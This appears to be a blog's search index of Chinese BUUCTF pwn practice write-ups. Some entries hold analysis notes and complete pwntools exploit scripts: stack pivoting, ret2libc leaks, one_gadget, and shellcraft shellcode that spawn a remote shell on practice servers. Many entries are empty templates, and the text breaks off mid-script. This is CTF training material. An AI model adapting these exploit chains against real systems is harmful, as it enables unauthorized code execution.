<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>71~80</title>
    <link href="/2024/03/05/WP/BUUCTF/71-80/"/>
    <url>/2024/03/05/WP/BUUCTF/71-80/</url>
    
    <content type="html"><![CDATA[<h1 id="71"><a href="#71" class="headerlink" title="71."></a>71.</h1><h2 id="1-分析"><a href="#1-分析" class="headerlink" title="(1)分析"></a>(1)分析</h2><h2 id="2-payload"><a href="#2-payload" class="headerlink" title="(2)payload"></a>(2)payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><br></code></pre></td></tr></table></figure><h1 id="72"><a href="#72" class="headerlink" title="72."></a>72.</h1><h2 id="1-分析-1"><a href="#1-分析-1" class="headerlink" title="(1)分析"></a>(1)分析</h2><h2 id="2-payload-1"><a href="#2-payload-1" class="headerlink" title="(2)payload"></a>(2)payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><br></code></pre></td></tr></table></figure><h1 id="73"><a href="#73" class="headerlink" title="73."></a>73.</h1><h2 id="1-分析-2"><a href="#1-分析-2" class="headerlink" title="(1)分析"></a>(1)分析</h2><h2 id="2-payload-2"><a href="#2-payload-2" class="headerlink" title="(2)payload"></a>(2)payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><br></code></pre></td></tr></table></figure><h1 id="74"><a href="#74" class="headerlink" title="74."></a>74.</h1><h2 id="1-分析-3"><a href="#1-分析-3" class="headerlink" title="(1)分析"></a>(1)分析</h2><h2 id="2-payload-3"><a href="#2-payload-3" class="headerlink" title="(2)payload"></a>(2)payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><br></code></pre></td></tr></table></figure><h1 id="75"><a href="#75" class="headerlink" title="75."></a>75.</h1><h2 id="1-分析-4"><a href="#1-分析-4" class="headerlink" title="(1)分析"></a>(1)分析</h2><h2 id="2-payload-4"><a href="#2-payload-4" class="headerlink" title="(2)payload"></a>(2)payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><br></code></pre></td></tr></table></figure><h1 id="76"><a href="#76" class="headerlink" title="76."></a>76.</h1><h2 id="1-分析-5"><a href="#1-分析-5" class="headerlink" title="(1)分析"></a>(1)分析</h2><h2 id="2-payload-5"><a href="#2-payload-5" class="headerlink" title="(2)payload"></a>(2)payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><br></code></pre></td></tr></table></figure><h1 id="77"><a href="#77" class="headerlink" title="77."></a>77.</h1><h2 id="1-分析-6"><a href="#1-分析-6" class="headerlink" title="(1)分析"></a>(1)分析</h2><h2 id="2-payload-6"><a href="#2-payload-6" class="headerlink" title="(2)payload"></a>(2)payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><br></code></pre></td></tr></table></figure><h1 id="78"><a href="#78" class="headerlink" title="78."></a>78.</h1><h2 id="1-分析-7"><a href="#1-分析-7" class="headerlink" title="(1)分析"></a>(1)分析</h2><h2 id="2-payload-7"><a href="#2-payload-7" class="headerlink" title="(2)payload"></a>(2)payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><br></code></pre></td></tr></table></figure><h1 id="79"><a href="#79" class="headerlink" title="79."></a>79.</h1><h2 id="1-分析-8"><a href="#1-分析-8" class="headerlink" title="(1)分析"></a>(1)分析</h2><h2 id="2-payload-8"><a href="#2-payload-8" class="headerlink" title="(2)payload"></a>(2)payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><br></code></pre></td></tr></table></figure><h1 id="80"><a href="#80" class="headerlink" title="80."></a>80.</h1><h2 id="1-分析-9"><a href="#1-分析-9" class="headerlink" title="(1)分析"></a>(1)分析</h2><h2 id="2-payload-9"><a href="#2-payload-9" class="headerlink" title="(2)payload"></a>(2)payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
      <category>pwn练习记录</category>
      
      <category>BUUCTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>61~70</title>
    <link href="/2024/01/23/WP/BUUCTF/61-70/"/>
    <url>/2024/01/23/WP/BUUCTF/61-70/</url>
    
    <content type="html"><![CDATA[<h1 id="61-gyctf-2020-borrowstack"><a href="#61-gyctf-2020-borrowstack" class="headerlink" title="61.gyctf_2020_borrowstack"></a>61.gyctf_2020_borrowstack</h1><h2 id="1-分析"><a href="#1-分析" class="headerlink" title="(1)分析"></a>(1)分析</h2><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240305215004896.png" alt="image-20240305215004896"></p><p>main</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240305215648594.png" alt="image-20240305215648594"></p><p>read漏洞，溢出0x10字节，无system，ret2libc</p><p>ret2libc大概需要0x20字节，不够，上面read了两次，中间接了一个puts函数，栈劫持标志</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240305221150359.png" alt="image-20240305221150359"></p><p>bank在bss段，我们就将栈劫持到这里执行payload</p><h2 id="2-payload"><a href="#2-payload" class="headerlink" title="(2)payload"></a>(2)payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>io=remote(<span class="hljs-string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="hljs-number">29601</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./61&#x27;</span>)<br><br>puts_plt=elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got=elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>pop_rdi_ret=<span class="hljs-number">0x400703</span><br>leave_ret=<span class="hljs-number">0x400699</span><br>ret=<span class="hljs-number">0x4004c9</span><span class="hljs-comment">#栈平衡会需要这个gadget凑数</span><br>bank=<span class="hljs-number">0x601080</span><br>main_addr=elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br>padding=<span class="hljs-number">0x60</span><span class="hljs-comment">#偏移地址</span><br><br><span class="hljs-comment">#迁移到bank内</span><br><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*padding+p64(bank)+p64(leave_ret)<br>io.recvuntil(<span class="hljs-string">b&#x27;u want&#x27;</span>)<br>io.send(payload)<br><br><span class="hljs-comment">#leak puts</span><br><br>io.recvuntil(<span class="hljs-string">b&#x27;now!&#x27;</span>)<br>payload1=p64(ret)*<span class="hljs-number">20</span><span class="hljs-comment">#0x20为什么不行？</span><br>payload1+=p64(pop_rdi_ret)+p64(puts_got)<br>payload1+=p64(puts_plt)+p64(main_addr)<br><br>io.sendline(payload1)<br>io.recv()<br>puts_addr=u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>log.success(<span class="hljs-string">&#x27;leak_puts_real_addr =&gt; &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(puts_addr)))<br><br><span class="hljs-comment">#ret2libc</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">libc = LibcSearcher(&quot;puts&quot;,puts_addr)</span><br><span class="hljs-string">libcbase = puts_addr - libc.dump(&#x27;puts&#x27;)</span><br><span class="hljs-string">system_addr = libcbase + libc.dump(&#x27;system&#x27;)</span><br><span class="hljs-string">str_bin_sh = libcbase + libc.dump(&#x27;str_bin_sh&#x27;)</span><br><span class="hljs-string"></span><br><span class="hljs-string">libc=ELF(&#x27;64libc-2.23.so&#x27;)</span><br><span class="hljs-string">libcbase = puts_addr-libc.sym[&#x27;puts&#x27;]</span><br><span class="hljs-string">system_addr=libcbase+libc.sym[&#x27;system&#x27;]</span><br><span class="hljs-string">str_bin_sh=libcbase+next(libc.search(b&quot;/bin/sh&quot;))                        </span><br><span class="hljs-string">payload2=b&#x27;a&#x27;*padding+p64(0xdeadbeef)+p64(pop_rdi_ret)+p64(str_bin_sh)+p64(system_addr)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>libc=ELF(<span class="hljs-string">&#x27;64libc-2.23.so&#x27;</span>)<br>libcbase = puts_addr-libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>one_gadget=libcbase+<span class="hljs-number">0xf1147</span><br>payload2=<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x60</span>+<span class="hljs-number">8</span>)+p64(one_gadget)<br>io.sendline(payload2)<br>io.interactive()<br></code></pre></td></tr></table></figure><p><strong>总结：</strong>一开始我利用0x601080去做栈迁移，没有利用成功。看了其他师傅的wp后知道了，bank的地址距离got表特别近，我们构造rop的时候增高了栈帧，破坏了got表，因此我们在做栈迁移的时候要把地址相对的抬高些，以免在其又一次运行main函数时候，申请的临时变量的空间会覆盖到了我们的got表中。</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240305224044238.png" alt="image-20240305224044238"></p><p>还有就是其他师傅的wp都是使用one_gadget来找libc的，好像libcsearcher和自带的libc不行，不知道为什么。</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240309154756679.png" alt="image-20240309154756679"></p><h1 id="62-ciscn-2019-s-9"><a href="#62-ciscn-2019-s-9" class="headerlink" title="62.ciscn_2019_s_9"></a>62.ciscn_2019_s_9</h1><p>手写shellcode</p><h2 id="1-分析-1"><a href="#1-分析-1" class="headerlink" title="(1)分析"></a>(1)分析</h2><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240309155044854.png" alt="image-20240309155044854"></p><p>main</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240309162537924.png" alt="image-20240309162537924"></p><p>pwn</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240309162559546.png" alt="image-20240309162559546"></p><p>溢出26字节</p><p>hint</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240309162650444.png" alt="image-20240309162650444"></p><h2 id="2-payload-1"><a href="#2-payload-1" class="headerlink" title="(2)payload"></a>(2)payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><br></code></pre></td></tr></table></figure><h1 id="63-picoctf-2018-shellcode"><a href="#63-picoctf-2018-shellcode" class="headerlink" title="63.picoctf_2018_shellcode"></a>63.picoctf_2018_shellcode</h1><h2 id="1-分析-2"><a href="#1-分析-2" class="headerlink" title="(1)分析"></a>(1)分析</h2><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240309202040223.png" alt="image-20240309202040223"></p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240309213004329.png" alt="image-20240309213004329"></p><p>反汇编不了，我们看看是怎么回事</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240309213054720.png" alt="image-20240309213054720"></p><p>这里call了一个eax，导致出错，我们先nop掉，然后用快捷键p重新改写main函数（逆向的花指令）</p><p>main</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240310122210496.png" alt="image-20240310122210496"></p><p>vuln</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240310122239214.png" alt="image-20240310122239214"></p><p>很明显我们在a1这插入shellcode就行了</p><h2 id="2-payload-2"><a href="#2-payload-2" class="headerlink" title="(2)payload"></a>(2)payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=<span class="hljs-string">&#x27;i386&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>io=remote(<span class="hljs-string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="hljs-number">28842</span>)<br><br>io.sendline(asm(shellcraft.sh()))<br>io.interactive()<br></code></pre></td></tr></table></figure><h1 id="64-hitcontraining-heapcreator"><a href="#64-hitcontraining-heapcreator" class="headerlink" title="64.hitcontraining_heapcreator"></a>64.hitcontraining_heapcreator</h1><h2 id="1-分析-3"><a href="#1-分析-3" class="headerlink" title="(1)分析"></a>(1)分析</h2><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240310123441397.png" alt="image-20240310123441397"></p><h2 id="2-payload-3"><a href="#2-payload-3" class="headerlink" title="(2)payload"></a>(2)payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><br></code></pre></td></tr></table></figure><h1 id="65"><a href="#65" class="headerlink" title="65."></a>65.</h1><h2 id="1-分析-4"><a href="#1-分析-4" class="headerlink" title="(1)分析"></a>(1)分析</h2><h2 id="2-payload-4"><a href="#2-payload-4" class="headerlink" title="(2)payload"></a>(2)payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><br></code></pre></td></tr></table></figure><h1 id="66"><a href="#66" class="headerlink" title="66."></a>66.</h1><h2 id="1-分析-5"><a href="#1-分析-5" class="headerlink" title="(1)分析"></a>(1)分析</h2><h2 id="2-payload-5"><a href="#2-payload-5" class="headerlink" title="(2)payload"></a>(2)payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><br></code></pre></td></tr></table></figure><h1 id="67"><a href="#67" class="headerlink" title="67."></a>67.</h1><h2 id="1-分析-6"><a href="#1-分析-6" class="headerlink" title="(1)分析"></a>(1)分析</h2><h2 id="2-payload-6"><a href="#2-payload-6" class="headerlink" title="(2)payload"></a>(2)payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><br></code></pre></td></tr></table></figure><h1 id="68"><a href="#68" class="headerlink" title="68."></a>68.</h1><h2 id="1-分析-7"><a href="#1-分析-7" class="headerlink" title="(1)分析"></a>(1)分析</h2><h2 id="2-payload-7"><a href="#2-payload-7" class="headerlink" title="(2)payload"></a>(2)payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><br></code></pre></td></tr></table></figure><h1 id="69"><a href="#69" class="headerlink" title="69."></a>69.</h1><h2 id="1-分析-8"><a href="#1-分析-8" class="headerlink" title="(1)分析"></a>(1)分析</h2><h2 id="2-payload-8"><a href="#2-payload-8" class="headerlink" title="(2)payload"></a>(2)payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><br></code></pre></td></tr></table></figure><h1 id="70"><a href="#70" class="headerlink" title="70."></a>70.</h1><h2 id="1-分析-9"><a href="#1-分析-9" class="headerlink" title="(1)分析"></a>(1)分析</h2><h2 id="2-payload-9"><a href="#2-payload-9" class="headerlink" title="(2)payload"></a>(2)payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
      <category>pwn练习记录</category>
      
      <category>BUUCTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>51~60</title>
    <link href="/2024/01/23/WP/BUUCTF/51-60/"/>
    <url>/2024/01/23/WP/BUUCTF/51-60/</url>
    
    <content type="html"><![CDATA[<h1 id="51-mrctf2020-easyoverflow"><a href="#51-mrctf2020-easyoverflow" class="headerlink" title="51.mrctf2020_easyoverflow"></a>51.mrctf2020_easyoverflow</h1><p>ret2text</p><h2 id="1-分析"><a href="#1-分析" class="headerlink" title="(1)分析"></a>(1)分析</h2><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240123191429618.png" alt="image-20240123191429618"></p><p>main函数：</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240220151809322.png" alt="image-20240220151809322"></p><p>简单来说就是让check函数执行后返回值为0，我们就能拿到后门函数，注意这里有gets函数漏洞，也就是溢出点在V4这。</p><p>check函数：</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240220151934994.png" alt="image-20240220151934994"></p><p>意思也很明显，就是检查V5是否和fake_flag相等，相等就返回0，那么思路就来了，要么我们通过溢出点覆盖V5让其等于fake_flag，要么我们将两个都覆盖为同一个值，回到主函数查看V4位置。</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240220152458741.png" alt="image-20240220152458741"></p><p>我们发现V5距离V4有0x30个字节大小，偏移量确定。</p><p>看一下fake_flag是啥</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240220153418888.png" alt="image-20240220153418888"></p><p>那么接下来payload就好写了。</p><h2 id="2-payload"><a href="#2-payload" class="headerlink" title="(2)payload"></a>(2)payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>) <br>io=remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">29338</span>)<br><br>backdoor_addr=<span class="hljs-number">0x087D</span><br>padding=<span class="hljs-number">0x30</span><br><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*padding+<span class="hljs-string">b&quot;n0t_r3@11y_f1@g&quot;</span><br><br>io.sendline(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure><h1 id="52-xdctf2015-pwn200"><a href="#52-xdctf2015-pwn200" class="headerlink" title="52.*xdctf2015_pwn200"></a>52.*xdctf2015_pwn200</h1><h2 id="1-分析-1"><a href="#1-分析-1" class="headerlink" title="(1)分析"></a>(1)分析</h2><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240220173622514.png" alt="image-20240220173622514"></p><p>main函数：</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240220173941127.png" alt="image-20240220173941127"></p><p>vuln函数：</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240220173824481.png" alt="image-20240220173824481"></p><p>read漏洞，溢出152字节，完全够用</p><p>偏移地址cyclic动调一下，是0x70&#x3D;112字节</p><p>考虑到开了NX保护，优先选择ret2libc，那么payload的构造套用模板就行</p><h2 id="2-payload-1"><a href="#2-payload-1" class="headerlink" title="(2)payload"></a>(2)payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=<span class="hljs-string">&#x27;i386&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>io=remote(<span class="hljs-string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="hljs-number">27705</span>)<br><span class="hljs-comment">#io=process(&#x27;./xxx&#x27;)</span><br>elf=ELF(<span class="hljs-string">&#x27;./52&#x27;</span>)<br><br>vuln_addr=elf.sym[<span class="hljs-string">&#x27;vuln&#x27;</span>]<span class="hljs-comment">#在溢出点在这，所以第一次要返回到vuln函数中进行第二次攻击</span><br>write_plt=elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br>write_got=elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>padding=<span class="hljs-number">0x6c</span>+<span class="hljs-number">4</span><span class="hljs-comment">#偏移地址</span><br><br>payload1=<span class="hljs-string">b&#x27;a&#x27;</span>*padding<br>payload1 += p32(write_plt)+p32(vuln_addr)<br>payload1 += p32(<span class="hljs-number">1</span>)+p32(write_got)+p32(<span class="hljs-number">4</span>)<br><br><span class="hljs-comment">#根据函数的用法来构造，如果是puts函数则参考64位的方法</span><br><br>io.sendline(payload1)<br><br><span class="hljs-comment">#下面这个需要根据实际情况获取泄露函数真实地址（看debug返回的信息判断如何接收）</span><br><span class="hljs-comment">#write_addr=u32(io.recv(4))</span><br>write_addr=u32(io.recvuntil(<span class="hljs-string">&#x27;\xf7&#x27;</span>)[-<span class="hljs-number">4</span>:])<br>log.success(<span class="hljs-string">&#x27;leak_write_real_addr =&gt; &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(write_addr)))<br>            <br><span class="hljs-comment">#以下为通用操作</span><br><span class="hljs-string">&#x27;&#x27;&#x27;libc = LibcSearcher(&quot;write&quot;,write_addr)</span><br><span class="hljs-string">libcbase=write_addr-libc.dump(&#x27;write&#x27;)</span><br><span class="hljs-string">system_addr=libcbase+libc.dump(&quot;system&quot;)</span><br><span class="hljs-string">str_bin_sh=libcbase+libc.dump(&#x27;str_bin_sh&#x27;)&#x27;&#x27;&#x27;</span><br><br>libc=ELF(<span class="hljs-string">&#x27;32libc-2.23.so&#x27;</span>)<br>libcbase=write_addr-libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>system_addr=libcbase+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>str_bin_sh=libcbase+<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&quot;/bin/sh&quot;</span>))<br>            <br>payload2 = <span class="hljs-string">b&#x27;a&#x27;</span>*padding+p32(system_addr)+p32(<span class="hljs-number">0</span>)+p32(str_bin_sh)<br><br>io.sendline(payload2)<br>io.interactive()<br></code></pre></td></tr></table></figure><p>PS：根据网上师傅的WP，接收地址的问题可以通过看debug来解决</p><h1 id="53-ciscn-2019-s-4"><a href="#53-ciscn-2019-s-4" class="headerlink" title="53.*ciscn_2019_s_4"></a>53.*ciscn_2019_s_4</h1><h2 id="1-分析-2"><a href="#1-分析-2" class="headerlink" title="(1)分析"></a>(1)分析</h2><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240226200046043.png" alt="image-20240226200046043"></p><p>main</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240226200234147.png" alt="image-20240226200234147"></p><p>vul</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240226200324735.png" alt="image-20240226200324735"></p><p>read漏洞，溢出8字节</p><p>hack</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240226201206355.png" alt="image-20240226201206355"></p><p>没有&#x2F;bin&#x2F;sh字符串，需要自己填充，然后利用ROP链执行</p><p>但是8字节不够用，两次read溢出，加中间的printf泄露旧ebp地址，就是上次遇到的25题，当复习了，顺便搞个模板</p><p>思路还是</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">28967</span>)<br><br>system_addr=xxx<span class="hljs-comment">#没有后门函数就自己构造，可能会与ret2libc结合</span><br>leave_ret=xxx<span class="hljs-comment">#用ROPgadget找</span><br>padding=xxx<br><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*(padding-<span class="hljs-number">1</span>)+<span class="hljs-string">b&#x27;b&#x27;</span><span class="hljs-comment">#这里栈溢出覆盖后用b做了个标记方便获取ebp的地址</span><br>io.send(payload)<span class="hljs-comment">#注意使用send输入</span><br>io.recvuntil(<span class="hljs-string">b&quot;b&quot;</span>)<br>s=u32(io.recv(<span class="hljs-number">4</span>))-<span class="hljs-number">0x38</span><span class="hljs-comment">#旧ebp-offset=esp（s起始位置）</span><br><span class="hljs-comment">#跳转到s的起始地址，即重新调转到这个栈内执行</span><br><br><span class="hljs-comment">#重新布置栈，进行栈劫持</span><br>payload2=<span class="hljs-string">b&#x27;aaaa&#x27;</span>+p32(system_addr)+p32(<span class="hljs-number">0xdeadbeef</span>)+p32(s+<span class="hljs-number">0x10</span>)+<span class="hljs-string">b&quot;/bin/sh&quot;</span><br>payload2=payload2.ljust(padding,<span class="hljs-string">b&#x27;\x00&#x27;</span>) <br>payload2+=p32(s)+p32(leave_ret)<span class="hljs-comment">#先覆盖ebp，再覆盖返回地址</span><br><br>io.send(payload2)<br>io.interactive()<br></code></pre></td></tr></table></figure><h2 id="2-payload-2"><a href="#2-payload-2" class="headerlink" title="(2)payload"></a>(2)payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io=remote(<span 